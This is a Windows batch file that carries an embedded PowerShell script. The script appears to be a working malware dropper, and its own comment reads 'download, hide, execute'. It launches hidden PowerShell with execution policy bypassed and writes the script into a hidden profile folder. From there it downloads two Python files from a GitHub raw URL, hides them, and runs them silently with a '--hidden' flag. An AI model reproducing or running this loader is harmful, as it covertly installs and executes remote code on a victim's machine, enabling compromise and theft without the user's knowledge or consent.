@echo off
setlocal
set "CFG=%USERPROFILE%\.configs"

if not exist "%CFG%" mkdir "%CFG%"
if exist "%CFG%\pp.ps1" attrib -h "%CFG%\pp.ps1" >nul 2>&1

start "" powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$l=Get-Content -LiteralPath '%~f0'; $s=-1; for($i=0;$i -lt $l.Count;$i++){if($l[$i].Trim() -eq 'REM ====PS1===='){$s=$i+1;break}}; if($s -lt 0){exit 1}; $body=($l[$s..($l.Count-1)] -join [Environment]::NewLine); [IO.File]::WriteAllText('%CFG%\pp.ps1',$body,(New-Object System.Text.UTF8Encoding $false)); & '%CFG%\pp.ps1'"

exit
endlocal

REM ====PS1====
# ============================================
# pp.ps1 - download, hide, execute (FIXED)
# ============================================

$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$configPath = Join-Path $env:USERPROFILE ".configs"
if (-not (Test-Path -Path $configPath)) {
    New-Item -Path $configPath -ItemType Directory -Force | Out-Null
}


$d = Get-Item -LiteralPath $configPath -Force
$d.Attributes = $d.Attributes -bor [System.IO.FileAttributes]::Hidden


function Save-HiddenFile {
    param([string]$Url, [string]$Path)
    if (Test-Path -LiteralPath $Path) {
        try { (Get-Item -LiteralPath $Path -Force).Attributes = 'Normal' } catch {}
    }
    Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
    $f = Get-Item -LiteralPath $Path -Force
    $f.Attributes = $f.Attributes -bor [System.IO.FileAttributes]::Hidden
}

# ---- 1. pypy.py (source = client.py) ----
$finalPath = Join-Path $configPath "client.py"

Save-HiddenFile -Url "https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.py" -Path $finalPath


# ---- 2. auto.py ----
$finalPath3 = Join-Path $configPath "auto.py"

Save-HiddenFile -Url "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.py" -Path $finalPath3


# ---- 5. Launch (single process) ----

$launchArgs = @('-3', '-u', "`"$finalPath3`"", "`"$finalPath`"", '--hidden')

Start-Process -FilePath 'py' -ArgumentList $launchArgs -WorkingDirectory $configPath -WindowStyle Hidden
